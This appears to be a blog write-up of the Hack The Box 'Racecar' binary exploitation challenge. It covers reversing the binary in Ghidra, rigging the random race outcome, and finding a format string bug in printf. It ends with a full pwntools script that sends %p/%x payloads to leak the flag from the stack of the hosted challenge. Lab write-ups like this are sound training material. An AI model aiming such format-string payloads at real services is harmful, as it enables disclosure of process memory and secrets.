---
title: Binary Exploitation Writeup - Racecar
published: true
date: 2025-02-06 00:00:00 +/-0000
categories: [general,ctf]
tags: [ctf,htb,binexp,binary exploitation,reverse engineering]     # TAG names should always be lowercase
image:
    path: /assets/images/2025/malware.jpg
---

# HTB - Racecar

This was a great way to get back into the swing of things. Rated "Very Easy" by Hack The Box, this `pwn` binary required a few hours of work on my part to solve.

This challenge is shipped without any source code, so we're meant to both reverse engineer the binary and develop an exploit for it. Our first job then is to understand how it works. If we run the `racecar` binary from the command line, we can see that we're prompted with a series of menus to select a car to race with and earn some coins.

![alt text](/assets/images/2025/racecar.png)

The prompts include:

* A Name
* A Nickname
* Car Info vs. Selection menus
* Car Selection
* Racetrack selection

Using `ghidra`, we're able to map out the codeflow through the decompiled code:

```c
void main(void)

{
  int iVar1;
  int iVar2;
  int in_GS_OFFSET;
  
  iVar1 = *(int *)(in_GS_OFFSET + 0x14);
  setup();
  banner();
  info();
  while (check != 0) {
    iVar2 = menu();
    if (iVar2 == 1) {
      car_info();
    }
    else if (iVar2 == 2) {
      check = 0;
      car_menu();
    }
    else {
      printf("\n%s[-] Invalid choice!%s\n",&DAT_00011548,&DAT_00011538);
    }
  }
  if (iVar1 != *(int *)(in_GS_OFFSET + 0x14)) {
    __stack_chk_fail_local();
  }
  return;
}
```

This is the `main()` function; we're fortunate to have the custom function names retained (like `setup()`, `banner()`, etc.). We're also lucky that this isn't too complex; even without using `GDB` to trace the code flow dynamically, we can pretty trivially follow the code execution. My immediate goal was to determine where the flag would be. Hopping about to-and-from the various functions called within `main()`, eventually I'm able to find that within `car_menu()`.

```c
void car_menu(void)

{
  int carselection;
  int racetype;
  uint __seed;
  int iVar1;
  size_t sVar2;
  char *__format;
  FILE *__stream;
  int in_GS_OFFSET;
  undefined *puVar3;
  undefined4 uVar4;
  undefined4 uVar5;
  uint local_54;
  char local_3c [44];
  int local_10;
  
  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  uVar4 = 0xffffffff;
  uVar5 = 0xffffffff;
  do {
    printf(&Select_car_string);
    carselection = read_int(uVar4,uVar5);
    if ((carselection != 2) && (carselection != 1)) {
      printf("\n%s[-] Invalid choice!%s\n",&DAT_00011548,&DAT_00011538);
    }
  } while ((carselection != 2) && (carselection != 1));
  racetype = race_type();
  __seed = time((time_t *)0x0);
  srand(__seed);
  if (((carselection == 1) && (racetype == 2)) || ((carselection == 2 && (racetype == 2)))) {
    racetype = rand();
    racetype = racetype % 10;
    iVar1 = rand();
    iVar1 = iVar1 % 100;
  }
  else if (((carselection == 1) && (racetype == 1)) || ((carselection == 2 && (racetype == 1)))) {
    racetype = rand();
    racetype = racetype % 100;
    iVar1 = rand();
    iVar1 = iVar1 % 10;
  }
  else {
    racetype = rand();
    racetype = racetype % 100;
    iVar1 = rand();
    iVar1 = iVar1 % 100;
  }
  local_54 = 0;
  while( true ) {
    sVar2 = strlen("\n[*] Waiting for the race to finish...");
    if (sVar2 <= local_54) break;
    putchar((int)"\n[*] Waiting for the race to finish..."[local_54]);
    if ("\n[*] Waiting for the race to finish..."[local_54] == '.') {
      sleep(0);
    }
    local_54 = local_54 + 1;
  }
  if (((carselection == 1) && (racetype < iVar1)) || ((carselection == 2 && (iVar1 < racetype)))) {
    printf("%s\n\n[+] You won the race!! You get 100 coins!\n",&DAT_00011540);
    coins = coins + 100;
    puVar3 = &DAT_00011538;
    printf("[+] Current coins: [%d]%s\n",coins,&DAT_00011538);
    printf("\n[!] Do you have anything to say to the press after your big victory?\n> %s",
           &DAT_000119de);
    __format = (char *)malloc(0x171);
    __stream = fopen("flag.txt","r");
    if (__stream == (FILE *)0x0) {
      printf("%s[-] Could not open flag.txt. Please contact the creator.\n",&DAT_00011548,puVar3);
                    /* WARNING: Subroutine does not return */
      exit(0x69);
    }
    fgets(local_3c,0x2c,__stream);
    read(0,__format,0x170);
    puts(
        "\n\x1b[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: \x1b[0m"
        );
    printf(__format);
  }
  else if (((carselection == 1) && (iVar1 < racetype)) ||
          ((carselection == 2 && (racetype < iVar1)))) {
    printf("%s\n\n[-] You lost the race and all your coins!\n",&DAT_00011548);
    coins = 0;
    printf("[+] Current coins: [%d]%s\n",0,&DAT_00011538);
  }
  if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
    __stack_chk_fail_local();
  }
  return;
}
```

I renamed a couple of the variable names here to make it easier to track (namely: `carselection` and `racetype`). However at a high level, here's what's happening:

1. The user is prompted to pick a car (1 or 2).
2. The user is then prompted to pick a race type via a call to `race_type()` (again, 1 or 2).
3. Depending on which combination of car and race type are selected, `iVar1` and the `racetype` variables get randomly decided against some modulo math. Exactly which modulo values are used will differ based on the combination.
4. After this, a check is performed based on `carselection`, `iVar1`, and the `racetype` variables. If passed, the flag is read into memory but is not output anywhere.
5. The user is prompted for one more victory message.

Our first goal then is to ensure that the code flow arrives at reading in the flag to memory. Working backwards, that must make one of these evaluated as true:

```c
((carselection == 1) && (racetype < iVar1))
```

Or

```c
(carselection == 2 && (iVar1 < racetype))
```

We can trivially control `carselection` from the menu, but `racetype` and `iVar1` are a little more challenging. Those are set at random based on what `carselection` and `racetype` are. However, due to the modulo math, we can skew the likelihood of which will be larger in size.

* If `carselection` and `racetype` are 1 and 2 respectively, then `racetype` is likely to be smaller than `iVar1`.
* If `carselection` and `racetype` are 2 and 1 respectively, then `racetype` is likely to be greater than `iVar1`.
* If `carselection` and `racetype` are equal, then `racetype` is likely to be wrongly size relative to `iVar1`.

Ergo, we can go with either the first or second bullet(s) to land in our desired code block.

So now that we're able to get the code to load the code into memory, we need to figure out a way to pwn the binary and read it out. To that end, a close reading of the above decompiled code shows a format string vulnerability in the `printf(__format)` call.

![alt text](/assets/images/2025/format-string.png)

Passing a number of pointers to print out addresses verifies the vulnerability. Our final check at this point is setting a localized `flag.txt` file to a known value (I set AAAABBBBCCCC), then incrementally looking for that value by swapping out %p with %x instead. Since I know that the hex values of A, B, and C are 0x41, 0x42, and 0x43 respectively, I was just looking for it to get leaked:

![alt text](/assets/images/2025/format-string2.png)

My last step was working with `pwntools` to automate the exploit and connect to the binary being hosted on Hack The Box. The resulting exploit looked as such:

```python
#!/usr/bin/env python3
import sys
from pwn import *
context.update(arch='x86_64', os='linux')

def hex_to_ascii(hex_string, endianness='big'):
    """
    Converts a hex string to ASCII, considering endianness.
    
    :param hex_string: A string of hexadecimal values (e.g., '41414141')
    :param endianness: 'big' for big-endian, 'little' for little-endian
    :return: The corresponding ASCII string
    """
    # Convert hex string to bytes
    byte_array = bytes.fromhex(hex_string)
    
    # Reverse byte order for little-endian
    if endianness == 'little':
        byte_array = byte_array[::-1]
    
    
    byte_array = b''.join(byte_array[i:i+4][::-1] for i in range(0, len(byte_array), 4))
    
    return byte_array.decode('utf-8')


binstr = "./racecar"
ip = "94.237.55.182"
port = 46823

if (len(sys.argv)<= 1):
    p = process(binstr)
elif (sys.argv[1] == "dbg"):
    p = gdb.debug([binstr],'''
    unset env LINES
    unset env COLUMNS
    continue
    ''')
elif (sys.argv[1] == "remote"):
    p = remote(ip,port)
else:
    print(f"Invalid argument to e.py: '{sys.argv[1]}'. Did you mean 'dbg'?")
    sys.exit(1)

payload = b''
payload += b'%p' * 11
payload += b' %x%x%x%x%x%x%x%x%x%x%x'

# The program wouldn't accept input from send() or sendline()
p.sendlineafter(b'Name:', b'')
p.sendlineafter(b'Nickname:', b'')
p.sendlineafter(b'\n> ',b'2') #car_menu()
p.sendlineafter(b'\n> ',b'2') #car selection
p.sendlineafter(b'\n> ',b'1') #race selection
p.sendlineafter(b'\n> ', payload) #exploiting a format string

data = p.recv()
data = p.recv() #this is a bytestring
data = data.decode('utf-8') #convert to string
data = data.split(' ')[-1] #splits by spaces, grabs the last (which happens to be hex-encoded flag in this case)

print(data)
print(hex_to_ascii(data, 'big'))

p.interactive()
```

## Learning Outcomes

* In prior `pwntools` exploits, `p.send()` or `p.sendline()` worked fine. This was an unusual circumstance where the binary wasn't accepting it for reasons that weren't entirely clear to me. Using `p.sendlineafter()` proved apt.
* I hadn't seen print format in decompiled code before, so it was interesting to observe it in `ghidra` as `printf(__format);`.
* I'm looking at re-training reversing eye, so this proved to be a nice way to ease back into it.
